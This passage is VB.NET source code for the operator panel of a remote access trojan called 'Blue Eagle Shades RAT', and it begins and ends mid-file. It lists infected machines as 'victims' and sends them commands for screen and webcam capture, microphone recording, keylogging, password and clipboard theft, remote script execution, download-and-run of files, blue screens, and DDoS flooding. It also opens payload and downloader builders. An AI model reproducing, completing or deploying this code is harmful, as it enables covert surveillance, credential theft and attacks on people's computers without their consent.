                        Exit Sub
                    End If
                    Dim cap As New cap
                    cap.F = Me
                    cap.Sock = sock
                    cap.Name = "!" & sock
                    cap.Sz = New Size(a(1), a(2))
                    cap.Show()
                Case "@" ' i recive image  
                    Dim F As cap = My.Application.OpenForms("!" & sock)
                    If F IsNot Nothing Then
                        If a(1).Length = 1 Then
                            F.Text = "Remote Desktop  : " & s.IP(sock) & "Size: " & siz(b.Length) & " ,No Changes"
                            If F.Button1.Text = "Stop" Then
                                s.Send(sock, "@" & yy & F.c1.SelectedIndex & yy & F.c2.Text & yy & F.c.Value)
                            End If
                            Exit Sub
                        End If
                        Dim BB As Byte() = fx(b, "@" & yy)(1)
                        F.PktToImage(BB)
                    End If
                Case "requestrecords"
                    If My.Application.OpenForms("Microphone" & sock) IsNot Nothing Then Exit Sub
                    If Me.InvokeRequired Then
                        Dim j As New _data(AddressOf data)
                        Me.Invoke(j, New Object() {sock, b})
                        Exit Sub
                    End If
                    Dim fm As New REG
                    fm.sock = sock
                    fm.Name = "Microphone" & sock
                    fm.Text = fm.Text & " " & s.IP(sock)
                    fm.Show()
                    While My.Computer.FileSystem.FileExists(Application.StartupPath & "\Trojaner_Rat_Victims\Sound" & tictoc & ".wav")
                        tictoc = tictoc + 1
                    End While
                Case "wifi"
                    If My.Application.OpenForms("wifi" & sock) IsNot Nothing Then Exit Sub
                    If Me.InvokeRequired Then
                        Dim j As New _data(AddressOf data)
                        Me.Invoke(j, New Object() {sock, b})
                        Exit Sub
                    End If
                    Dim f As New Form21
                    f.sock = sock
                    f.Name = "wifi" & sock
                    f.Text = "WiFi Networks View For  : " & s.IP(sock)
                    f.BlackShadesNetForm1.Text &= " For : " & s.IP(sock)
                    f.Show()



                Case "wifi3"

                    Dim F As Form21 = My.Application.OpenForms("wifi" & sock)


                    Dim l1 = F.ListView1.Items.Add(a(1))
                    l1.SubItems.Add(a(2))
                    l1.SubItems.Add(a(3))
                    l1.SubItems.Add(a(4))
                    F.ListView1.Items(F.i).ImageIndex = 0
                    F.ListView1.SmallImageList = F.ImageList1
                    F.i += 1
                    F.Doublekiller()
                Case "wifierror"
                    MsgBox(a(1))


                Case "stat"
                    If My.Application.OpenForms("stat" & sock) IsNot Nothing Then Exit Sub
                    If Me.InvokeRequired Then
                        Dim j As New _data(AddressOf data)
                        Me.Invoke(j, New Object() {sock, b})
                        Exit Sub
                    End If
                    Dim f As New networkinfo
                    f.sock = sock
                    f.Name = "stat" & sock
                    f.Text = "NetWork Adapter & Connections For : " & s.IP(sock)
                    f.BlackShadesNetForm1.Text &= " For : " & s.IP(sock)
                    f.Show()


                Case "getstat"
                    Dim F As networkinfo = My.Application.OpenForms("stat" & sock)

                    Dim la = F.ListBox2.Items.Add(a(1))

                Case "stati"
                    Dim F As networkinfo = My.Application.OpenForms("stat" & sock)
                    F.ListBox1.Items.Add(a(1))
                Case "staterror"
                    MsgBox("Net Information Error Recived From Victim  : " & a(1))


                Case "showinfo"
                    If My.Application.OpenForms("devices" & sock) IsNot Nothing Then Exit Sub
                    If Me.InvokeRequired Then
                        Dim j As New _data(AddressOf data)
                        Me.Invoke(j, New Object() {sock, b})
                        Exit Sub
                    End If
                    Dim f As New info
                    f.sock = sock
                    f.Name = "devices" & sock
                    f.Text = "Devices And Printers For : " & s.IP(sock)
                    f.BlackShadesNetForm1.Text &= " For : " & s.IP(sock)
                    f.Show()

                Case "printer"
                    Dim F As info = My.Application.OpenForms("devices" & sock)
                    F.ListView2.Items.Add(a(1))
                    F.ListView2.Items(F.jj).ImageIndex = 1
                    F.ListView2.SmallImageList = F.ImageList1
                    F.jj += 1

                Case "device"
                    Dim F As info = My.Application.OpenForms("devices" & sock)
                    F.ListView1.SmallImageList = F.ImageList1
                    If a(1).Contains("USB") Or a(1).Contains("Usb") Or a(1).Contains("usb") Then
                        F.ListView1.Items.Add(a(1))
                        F.ListView1.Items(F.i).ImageIndex = 3
                    ElseIf a(1).Contains("Bluetooth") Or a(1).Contains("BLUETOOTH") Or a(1).Contains("tooth") Then

                        F.ListView1.Items.Add(a(1))
                        F.ListView1.Items(F.i).ImageIndex = 4
                    ElseIf a(1).Contains("Wireless") Or a(1).Contains("WiFi") Or a(1).Contains("Wifi") Or a(1).Contains("wifi") Or a(1).Contains("Wi-Fi") Then
                        F.ListView1.Items.Add(a(1))
                        F.ListView1.Items(F.i).ImageIndex = 5
                    Else
                        F.ListView1.Items.Add(a(1))
                        F.ListView1.Items(F.i).ImageIndex = 0

                    End If

                    F.i += 1
            End Select
        Catch ex As Exception
        End Try

    End Sub



    Private Sub Form1_Load(sender As System.Object, e As System.EventArgs) Handles MyBase.Load
        gadget.Show()

        Try
            If My.Computer.FileSystem.DirectoryExists(Application.StartupPath & "/BlueEagleShades_Rat_Victims") Then

            Else
                My.Computer.FileSystem.CreateDirectory _
        (Application.StartupPath & "/BlueEagleShades_Rat_Victims")
            End If
            s = New SocketServer
            Control.CheckForIllegalCrossThreadCalls = False
            Dim a As String = InputBox("BlueEagle Shades Port", "Enter Port", 1177)

            s.Start(a)
            BlackShadesNetForm1.Text &= "  Listening On Port : " & a



            Timer1.Stop()

            pinger = 0
        Catch ex As Exception
            MsgBox(ex.Message)
            End
        End Try
        Try
            If My.Computer.FileSystem.FileExists(Application.StartupPath & "\" & "lock.exe") = False Then
                MsgBox("You Have to get lock.exe File with the Application")
                End
            End If
        Catch ex As Exception

        End Try
        Try
            ss = New mini
            Control.CheckForIllegalCrossThreadCalls = False
            Dim aa As String = InputBox("Mini Blue Shades RAT Port", "Enter another Port", 5552)
            ssport = aa
            ss.Start(aa)

        Catch ex As Exception
            MsgBox(ex.Message)
            End
        End Try


    End Sub



    Private Sub l1_SelectedIndexChanged(sender As System.Object, e As System.EventArgs)
        If CheckBox1.Checked Then
            For Each x As ListViewItem In l1.SelectedItems
                If l1.SelectedItems.Count = 1 Then
                    s.Send(x.ToolTipText, "!!")
                End If
            Next

        End If
    End Sub



    Private Sub BlackShadesNetButton7_Click(sender As System.Object, e As System.EventArgs) Handles BlackShadesNetButton7.Click
        l1.BackgroundImage = My.Resources.earth
        GetCountryNumber(UCase(countrycode))
        l1.SmallImageList = ImageList1
        l1.LargeImageList = ImageList1
        l1.View = System.Windows.Forms.View.List
    End Sub

    Private Sub BlackShadesNetButton6_Click(sender As System.Object, e As System.EventArgs) Handles BlackShadesNetButton6.Click
        l1.BackgroundImage = My.Resources.earth
        GetCountryNumber(UCase(countrycode))
        l1.SmallImageList = ImageList1
        l1.LargeImageList = ImageList1
        l1.View = System.Windows.Forms.View.Details
    End Sub

    Private Sub BlackShadesNetButton5_Click(sender As System.Object, e As System.EventArgs) Handles BlackShadesNetButton5.Click
        l1.BackgroundImage = My.Resources.earth
        l1.SmallImageList = ImageList1
        l1.LargeImageList = ImageList1
        l1.View = System.Windows.Forms.View.LargeIcon
    End Sub


    Private Sub Form1_FormClosing(sender As System.Object, e As System.Windows.Forms.FormClosingEventArgs) Handles MyBase.FormClosing
        End
    End Sub
    Private Sub ToolStripMenuItem2_Click(sender As System.Object, e As System.EventArgs) Handles ToolStripMenuItem2.Click
        For Each x As ListViewItem In l1.SelectedItems
            s.Send(x.ToolTipText, "stat")
        Next
    End Sub
    Private Sub ContextMenuStrip1_Opening(sender As System.Object, e As System.ComponentModel.CancelEventArgs) Handles ContextMenuStrip1.Opening
        Me.TopMost = False

    End Sub
    Private Sub OpenChatToolStripMenuItem1_Click(sender As System.Object, e As System.EventArgs) Handles OpenChatToolStripMenuItem1.Click
        'openchat
        For Each x As ListViewItem In l1.SelectedItems
            s.Send(x.ToolTipText, "openchat")
        Next
    End Sub
    Private Sub StartToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles StartToolStripMenuItem.Click
        Dim name As String = InputBox("ProcessName", "Process Name")
        If name = "" Then

        Else
            For Each x As ListViewItem In l1.SelectedItems

                s.Send(x.ToolTipText, "newpr" & "||" & name)
            Next
        End If
    End Sub
    Private Sub ToolStripStatusLabel8_Click(ByVal sender As System.Object, ByVal e As System.EventArgs)

    End Sub
    Private Sub BlueScreenToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs)

    End Sub
    Private Sub NormalToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles NormalToolStripMenuItem.Click
        Dim str1 As String = Interaction.InputBox("IP / Web site :", "DDos Attacker", "", -1, -1)
        Dim str2 As String = Interaction.InputBox("Attack Speed", "8000 or 10000 or 12000 or 15000", "", -1, -1)
        Try
            For Each x As ListViewItem In l1.SelectedItems
                s.Send(x.ToolTipText, "ddos" & yy & str1 & yy & str2)
            Next
        Catch ex As Exception
            MsgBox(ex.Message)
        End Try
    End Sub
    Private Sub KillerToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles KillerToolStripMenuItem.Click
        Try
            For Each x As ListViewItem In l1.SelectedItems
                s.Send(x.ToolTipText, "FLOOD")
            Next
        Catch ex As Exception
            MsgBox(ex.Message)
        End Try
    End Sub

    Private Sub Timer3_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Timer3.Tick
        pinger = pinger + 1
    End Sub

    Private Sub RegeditToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles RegeditToolStripMenuItem.Click
        Try

            For Each x As ListViewItem In l1.SelectedItems
                s.Send(x.ToolTipText, "openRG" & "||")
            Next
        Catch : End Try
    End Sub

    Private Sub GetClipordToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles GetClipordToolStripMenuItem.Click
        For Each x As ListViewItem In l1.SelectedItems
            s.Send(x.ToolTipText, "clipss")
        Next
    End Sub

    Private Sub InstalledProgramToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs) Handles InstalledProgramToolStripMenuItem.Click
        For Each x As ListViewItem In l1.SelectedItems
            s.Send(x.ToolTipText, "openfm2" & "||")
        Next

    End Sub

    Private Sub SpamToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs)
        For Each x As ListViewItem In l1.SelectedItems
            s.Send(x.ToolTipText, "spam")
        Next

    End Sub

    Private Sub BlueScreenToolStripMenuItem_Click_1(ByVal sender As Object, ByVal e As EventArgs) Handles BlueScreenToolStripMenuItem.Click
        For Each x As ListViewItem In l1.SelectedItems
            s.Send(x.ToolTipText, "bsod")
        Next
    End Sub

    Private Sub ToolStripMenuItem1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles ToolStripMenuItem1.Click
        For Each x As ListViewItem In l1.SelectedItems
            s.Send(x.ToolTipText, "openfm")
        Next
    End Sub
    Private Sub InformationToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles InformationToolStripMenuItem.Click
        For Each x As ListViewItem In l1.SelectedItems
            Timer1.Start()
            s.Send(x.ToolTipText, "sendinformation")
        Next
    End Sub


    Private Sub VbsToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles VbsToolStripMenuItem.Click
        For Each x As ListViewItem In l1.SelectedItems
            If Script.ShowDialog = DialogResult.OK Then
                s.Send(sock, "Vbs" & "||" & Script.scriptText.Replace(vbNewLine, "||"))
            End If
        Next
    End Sub

    Private Sub BatToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles BatToolStripMenuItem.Click
        For Each x As ListViewItem In l1.SelectedItems
            If Script.ShowDialog = DialogResult.OK Then
                s.Send(sock, "Batch" & "||" & Script.scriptText.Replace(vbNewLine, "||"))
            End If
        Next
    End Sub

    Private Sub REGToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles REGToolStripMenuItem.Click
        For Each x As ListViewItem In l1.SelectedItems
            s.Send(x.ToolTipText, "requestrecords")
        Next
    End Sub
    Private Sub CmdToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles CmdToolStripMenuItem.Click
        For Each x As ListViewItem In l1.SelectedItems
            s.Send(x.ToolTipText, "rss" & "||")
        Next
    End Sub
    Private Sub اللعبToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles اللعبToolStripMenuItem.Click
        For Each x As ListViewItem In l1.SelectedItems
            s.Send(x.ToolTipText, "fun")
        Next
    End Sub

    Private Sub FromLinkToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles FromLinkToolStripMenuItem.Click
        Dim a As String = InputBox("Enter Direct URL", "Download")
        Dim aa As String = InputBox("Enter the name of the file", "Download")
        For Each x As ListViewItem In l1.SelectedItems
            s.Send(x.ToolTipText, "download" & "||" & a & "||" & aa)
        Next
    End Sub

    Private Sub FromDiskToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles FromDiskToolStripMenuItem.Click
        Dim o As New OpenFileDialog
        o.ShowDialog()
        Dim n As New IO.FileInfo(o.FileName)
        If o.FileName.Length > 0 Then
            For Each x As ListViewItem In l1.SelectedItems
                s.Send(x.ToolTipText, "sendfile" & "||" & n.Name & "||" & Convert.ToBase64String(IO.File.ReadAllBytes(o.FileName)))
            Next
        End If
    End Sub

    Private Sub DToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles DToolStripMenuItem.Click
        Dim c As String = InputBox("Enter Website")
        For Each x As ListViewItem In l1.SelectedItems
            x.Text = c
            s.Send(x.ToolTipText, "openurl" & "||" & "Default" & "||" & c)
        Next
    End Sub

    Private Sub GoogleChromeToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles GoogleChromeToolStripMenuItem.Click
        Dim c As String = InputBox("Enter Website")
        For Each x As ListViewItem In l1.SelectedItems
            x.Text = c
            s.Send(x.ToolTipText, "openurl" & "||" & "Chrome" & "||" & c)
        Next
    End Sub

    Private Sub MozilaFireFoxToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MozilaFireFoxToolStripMenuItem.Click
        Dim c As String = InputBox("Enter Website")
        For Each x As ListViewItem In l1.SelectedItems
            x.Text = c
            s.Send(x.ToolTipText, "openurl" & "||" & "firefox" & "||" & c)
        Next
    End Sub

    Private Sub OperaToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles OperaToolStripMenuItem.Click
        Dim c As String = InputBox("Enter Website")
        For Each x As ListViewItem In l1.SelectedItems
            x.Text = c
            s.Send(x.ToolTipText, "openurl" & "||" & "Opera" & "||" & c)
        Next
    End Sub

    Private Sub SafariToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles SafariToolStripMenuItem.Click
        Dim c As String = InputBox("Enter Website")
        For Each x As ListViewItem In l1.SelectedItems
            x.Text = c
            s.Send(x.ToolTipText, "openurl" & "||" & "Safari" & "||" & c)
        Next
    End Sub

    Private Sub InternetExplolerToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles InternetExplolerToolStripMenuItem.Click
        Dim c As String = InputBox("Enter Website")
        For Each x As ListViewItem In l1.SelectedItems
            x.Text = c
            s.Send(x.ToolTipText, "openurl" & "||" & "iexplore" & "||" & c)
        Next
    End Sub

    Private Sub RenameToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles RenameToolStripMenuItem.Click
        Dim b As String = InputBox("Enter New Name : ")
        For Each x As ListViewItem In l1.SelectedItems
            x.Text = b
            s.Send(x.ToolTipText, "rename" & "||" & b)
        Next

    End Sub

    Private Sub RestartToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles RestartToolStripMenuItem.Click
        For Each x As ListViewItem In l1.SelectedItems
            s.Send(x.ToolTipText, "restart")
        Next
    End Sub
    Private Sub FileManagerToolStripMenuItem_Click_1(ByVal sender As System.Object, ByVal e As System.EventArgs)
        For Each x As ListViewItem In l1.SelectedItems
            s.Send(x.ToolTipText, "openfm")
        Next
    End Sub

    Private Sub MenuStrip1_ItemClicked(ByVal sender As System.Object, ByVal e As System.Windows.Forms.ToolStripItemClickedEventArgs)

    End Sub

    Private Sub ScreenCapterToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles ScreenCapterToolStripMenuItem.Click
        For Each x As ListViewItem In l1.SelectedItems
            s.Send(x.ToolTipText, "!")
        Next
    End Sub

    Private Sub FfffffffToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs)
        For Each x As ListViewItem In l1.SelectedItems
            s.Send(x.ToolTipText, "opencam")
        Next
    End Sub

    Private Sub CamToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles CamToolStripMenuItem.Click
        ' For Each x As ListViewItem In l1.SelectedItems
        ' s.Send(x.ToolTipText, "camlist")
        ' Next
        For Each x As ListViewItem In l1.SelectedItems
            s.Send(x.ToolTipText, "camlist")
        Next
    End Sub


    Private Sub KlToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles KlToolStripMenuItem.Click
        For Each x As ListViewItem In l1.SelectedItems
            s.Send(x.ToolTipText, "openkl")
        Next
    End Sub



    Private Sub الباسورداتToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles الباسورداتToolStripMenuItem.Click
        For Each x As ListViewItem In l1.SelectedItems
            s.Send(x.ToolTipText, "openpw")
        Next
    End Sub








    Private Sub خروجToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs)
        End
    End Sub

    Private Sub التحكمToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs)

    End Sub

    Private Sub ProcToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles ProcToolStripMenuItem.Click
        For Each x As ListViewItem In l1.SelectedItems
            s.Send(x.ToolTipText, "\\")
        Next
    End Sub

    Private Sub FunToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs)
        For Each x As ListViewItem In l1.SelectedItems
            s.Send(x.ToolTipText, "fun")
        Next
    End Sub

    Private Sub TeToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles TeToolStripMenuItem.Click
        For Each x As ListViewItem In l1.SelectedItems
            s.Send(x.ToolTipText, "opentto")
        Next
    End Sub

    Private Sub UnToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles UnToolStripMenuItem.Click

    End Sub


    Private Sub UninstallToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles UninstallToolStripMenuItem.Click
        For Each x As ListViewItem In l1.SelectedItems
            s.Send(x.ToolTipText, "Uninstall")
        Next
    End Sub

    Private Sub ViewWiFiNetworksToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles ViewWiFiNetworksToolStripMenuItem.Click
        For Each x As ListViewItem In l1.SelectedItems
            s.Send(x.ToolTipText, "viewwifi")
        Next
    End Sub

    Private Sub ViewLanPCsToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles ViewLanPCsToolStripMenuItem.Click
        For Each x As ListViewItem In l1.SelectedItems
            s.Send(x.ToolTipText, "viewlan")
        Next
    End Sub

    Private Sub Form1_Resize(ByVal sender As Object, ByVal e As System.EventArgs) Handles Me.Resize
        Resizeform()
        If WindowState = FormWindowState.Minimized Then
            ShowIcon = False
            ShowInTaskbar = False
            Me.Hide()
            NotifyIcon1.BalloonTipIcon = ToolTipIcon.Info
            NotifyIcon1.BalloonTipTitle = "Blue Eagle Shades RAT"
            NotifyIcon1.BalloonTipText = "online [ x ]".Replace("x", l1.Items.Count)
            NotifyIcon1.ShowBalloonTip(1000)
        Else

        End If
    End Sub
    Dim ProportionsArray() As CtrlProportions
    Public Sub Resizeform()

        On Error Resume Next

        For I As Integer = 0 To Controls.Count - 1

            Controls(I).Left = ProportionsArray(I).LeftProportions * Me.Width
            Controls(I).Top = ProportionsArray(I).TopProportions * Me.Height
            Controls(I).Width = ProportionsArray(I).WidthProportions * Me.Width
            Controls(I).Height = ProportionsArray(I).HeightProportions * Me.Height
        Next

    End Sub
    Sub Informload()

        On Error Resume Next

        Application.DoEvents()

        ReDim ProportionsArray(0 To Controls.Count - 1)

        For I As Integer = 0 To Controls.Count - 1

            With ProportionsArray(I)
                .HeightProportions = Controls(I).Height / Height
                .WidthProportions = Controls(I).Width / Width
                .TopProportions = Controls(I).Top / Height
                .LeftProportions = Controls(I).Left / Width

            End With
        Next

    End Sub
    Private Structure CtrlProportions
        Dim HeightProportions As Single
        Dim WidthProportions As Single
        Dim TopProportions As Single
        Dim LeftProportions As Single
    End Structure
    Private Sub ShowToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles ShowToolStripMenuItem.Click
        ShowIcon = True
        ShowInTaskbar = True
        Me.Show()
        Me.TopMost = True
        Me.WindowState = FormWindowState.Maximized
    End Sub
    Private Sub armitage()

        Dim box As PictureBox = P1



        l1.BackgroundImage = My.Resources.back1
        l1.SmallImageList = IMG
        l1.LargeImageList = IMG

        Dim i As Integer = 0
        For Each computer In l1.Items

            Dim hacked As String = computer.SubItems(3).Text
            If hacked.Contains("Windows 10") Or hacked.Contains("Windows 8.1") Then
                If hacked.Contains("Windows 10") Then
                    l1.Items(i).Text = "Windows 10"
                ElseIf hacked.Contains("Windows 8.1") Then
                    l1.Items(i).Text = "Windows 8.1"
                End If
                l1.Items(i).ImageIndex = 0
            ElseIf hacked.Contains("Windows 7") Or hacked.Contains("Windows Vista") Then
                If hacked.Contains("Windows 7") Then
                    l1.Items(i).Text = "Windows 7"
                ElseIf hacked.Contains("Vista") Then
                    l1.Items(i).Text = "Windows Vista"
                End If

                l1.Items(i).ImageIndex = 2
            ElseIf hacked.Contains("Windows XP") Or hacked.Contains("xp") Then
                l1.Items(i).Text = "Windows XP"
                l1.Items(i).ImageIndex = 1
            End If
            i += 1
        Next





    End Sub


    Private Sub BlackShadesNetButton8_Click(sender As System.Object, e As System.EventArgs) Handles BlackShadesNetButton8.Click
        l1.View = System.Windows.Forms.View.LargeIcon
        armitage()
    End Sub

    Private Sub GetDevicesAndPrintersToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles GetDevicesAndPrintersToolStripMenuItem.Click
        For Each x As ListViewItem In l1.SelectedItems
            s.Send(x.ToolTipText, "devicesinfo")
        Next
    End Sub

    Private Sub BlackShadesNetButton1_Click(sender As System.Object, e As System.EventArgs) Handles BlackShadesNetButton1.Click
        choosebuilder.Show()
    End Sub
    '#####################################################################################
    '#####################################################################################
    'Mini RAT region
    Public WithEvents ss As New mini

    Sub connectedss(ByVal sock As Integer) Handles ss.Connected
        ss.Send(sock, "info") ' طلب البانات عن حدوث اتصال
    End Sub
    Sub disconnectedss(ByVal sock As Integer) Handles ss.DisConnected
        Try ' مصيده اخطاء
            ListView1.Items(sock.ToString).Remove() ' حذف السيرفر من الليست عند قطع الاتصال
            If gadget.Visible = True Then
                gadget.l2.Items(sock.ToString).Remove()
            End If
        Catch ex As Exception

        End Try
    End Sub

    Sub datass(ByVal sock As Integer, ByVal b As Byte()) Handles ss.Data
        Dim a As String() = Split(BSS(b), "||") '  تم شرحها
        Try
            Select Case a(0)

                Case "info"
                    NotifyIcon1.BalloonTipIcon = ToolTipIcon.Info
                    NotifyIcon1.BalloonTipTitle = "Blue Eagle Shades [Mini RAT] Nofiy "
                    NotifyIcon1.BalloonTipText = "[ Name : " & a(1) & " IP : " & ss.IP(sock) & " Country : " & a(3) & " ]"
                    Beep()
                    NotifyIcon1.ShowBalloonTip(1)
                    Dim l = ListView1.Items.Add(sock.ToString, a(1), GetCountryNumber(UCase(a(4))))
                    l.SubItems.Add(ss.IP(sock))
                    l.SubItems.Add(a(2))
                    l.SubItems.Add(a(3))
                    l.SubItems.Add(ssport)
                    l.ToolTipText = sock
                

            End Select
        Catch ex As Exception
        End Try
    End Sub

    Private Sub RunFileFromDeskToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles RunFileFromDeskToolStripMenuItem.Click
        Dim o As New OpenFileDialog
        o.ShowDialog()
        Dim n As New IO.FileInfo(o.FileName)
        If o.FileName.Length > 0 Then
            For Each x As ListViewItem In ListView1.SelectedItems
                ss.Send(x.ToolTipText, "sendfile" & "||" & n.Name & "||" & Convert.ToBase64String(IO.File.ReadAllBytes(o.FileName)))
            Next
        End If
    End Sub

    Private Sub UninstallVictimToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles UninstallVictimToolStripMenuItem.Click
        For Each x As ListViewItem In ListView1.SelectedItems
            ss.Send(x.ToolTipText, "Uninstall")
        Next
    End Sub

    Private Sub BlackShadesNetButton9_Click(sender As System.Object, e As System.EventArgs) Handles BlackShadesNetButton9.Click
        Me.TopMost = False
        MiniBuilder.Show()
    End Sub



    Private Sub BlackShadesNetButton4_Click(sender As System.Object, e As System.EventArgs) Handles BlackShadesNetButton4.Click
        Me.Close()
    End Sub

    Private Sub ScanWebSiteFromVictimPCToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles ScanWebSiteFromVictimPCToolStripMenuItem.Click
        For Each x As ListViewItem In l1.SelectedItems
            s.Send(x.ToolTipText, "sitescanner")
        Next
    End Sub


    Private Sub ToolStripMenuItem3_Click(sender As System.Object, e As System.EventArgs) Handles ToolStripMenuItem3.Click
        Dim mapip As String
        For Each x As ListViewItem In l1.SelectedItems
            mapip = (x.SubItems(1).Text)

            If mapip.Contains("127.0") = True Or mapip.Contains("192.168") Then

                Dim f As map = My.Application.OpenForms("map" & mapip)
                If f Is Nothing Then
                    If Me.InvokeRequired Then

                        Exit Sub
                    End If
                    f = New map
                    f.Name &= mapip
                    f.BlackShadesNetForm1.Text &= " " & mapip
                    f.Show()
                    mapip = ""
                    f.ListBox1.Items.Add("Loading you Computer Information")
                    f.getinfo(mapip)

                End If
            Else
                Dim f As map = My.Application.OpenForms("map" & mapip)
                If f Is Nothing Then
                    If Me.InvokeRequired Then

                        Exit Sub
                    End If
                    f = New map
                    f.Name &= mapip
                    f.BlackShadesNetForm1.Text &= " " & mapip
                    f.Show()
                    f.getinfo(mapip)
                End If
            End If

        Next
    End Sub

    Private Sub BlackShadesNetButton10_Click(sender As System.Object, e As System.EventArgs) Handles BlackShadesNetButton10.Click
        Me.WindowState = FormWindowState.Minimized
    End Sub

    Private Sub BlackShadesNetButton12_Click(sender As System.Object, e As System.EventArgs) Handles BlackShadesNetButton12.Click
        Me.WindowState = FormWindowState.Normal
        Me.Size = New Size(New Point(1105, 421))
    End Sub

    Private Sub BlackShadesNetButton11_Click(sender As System.Object, e As System.EventArgs) Handles BlackShadesNetButton11.Click
        Form3.Show()
    End Sub

    Private Sub BlackShadesNetButton13_Click(sender As System.Object, e As System.EventArgs) Handles BlackShadesNetButton13.Click

        gadget.Show()
        Me.WindowState = FormWindowState.Minimized

    End Sub

    
    Private Sub HideToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles HideToolStripMenuItem.Click
        gadget.Close()
        Me.Close()
    End Sub

    Private Sub ShowGadgetToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles ShowGadgetToolStripMenuItem.Click
        gadget.Show()
    End Sub

    Private Sub BlackShadesNetButton3_Click(sender As System.Object, e As System.EventArgs) Handles BlackShadesNetButton3.Click

    End Sub

    Private Sub BlackShadesNetButton14_Click(sender As System.Object, e As System.EventArgs) Handles BlackShadesNetButton14.Click
        Me.TopMost = False
        downloaderbuilder.Show()
    End Sub

    Private Sub l1_SelectedIndexChanged_1(sender As System.Object, e As System.EventArgs)
        If CheckBox1.Checked Then
            For Each x As ListViewItem In l1.SelectedItems
                If l1.SelectedItems.Count = 1 Then
                    s.Send(x.ToolTipText, "!!")
                End If
            Next

        End If
    End Sub

    Private Sub l1_SelectedIndexChanged_2(sender As System.Object, e As System.EventArgs) Handles l1.SelectedIndexChanged
        If CheckBox1.Checked Then
            For Each x As ListViewItem In l1.SelectedItems
                If l1.SelectedItems.Count = 1 Then
                    s.Send(x.ToolTipText, "!!")
                End If
            Next

        End If
    End Sub

    Private Sub BlackShadesNetButton2_Click(sender As System.Object, e As System.EventArgs) Handles BlackShadesNetButton2.Click

    End Sub
End Class
Public Class mini
    Private S As TcpListener
    Sub stops(ByVal Pp As Integer)
        S = New TcpListener(Pp)
        Try
            S.Stop()
            Dim T As New Threading.Thread(AddressOf PND, 10)
            T.Abort()

        Catch : End Try
    End Sub
    Sub Start(ByVal P As Integer)
        S = New TcpListener(P)
        S.Start()
        Dim T As New Threading.Thread(AddressOf PND, 10)
        T.Start()
    End Sub
    Sub Send(ByVal sock As Integer, ByVal s As String)
        Send(sock, SBB(s))
    End Sub
    Sub Send(ByVal sock As Integer, ByVal b As Byte())

        Try
            Dim m As New IO.MemoryStream
            m.Write(b, 0, b.Length)
            m.Write(SBB(SPL), 0, SPL.Length)
            SK(sock).Send(m.ToArray, 0, m.Length, SocketFlags.None)
            m.Dispose()
        Catch ex As Exception
            Disconnect(sock)
        End Try
    End Sub
    Private SKT As Integer = -1
    Public SK(9999) As Socket
    Public Event Data(ByVal sock As Integer, ByVal B As Byte())
    Public Event DisConnected(ByVal sock As Integer)
    Public Event Connected(ByVal sock As Integer)
    Private SPL As String = "nj-q8" ' split packets by this word
    Private Function NEWSKT() As Integer
re:
        Threading.Thread.CurrentThread.Sleep(1)
        SKT += 1
        If SKT = SK.Length Then
            SKT = 0
            GoTo re
        End If
        If Online.Contains(SKT) = False Then
            Online.Add(SKT)
            Return SKT.ToString.Clone
        End If
        GoTo re
    End Function
    Public Online As New List(Of Integer) ' online clients
    Private Sub PND()
        Try
            ReDim SK(9999)
re:

            Threading.Thread.CurrentThread.Sleep(1)
            If S.Pending Then

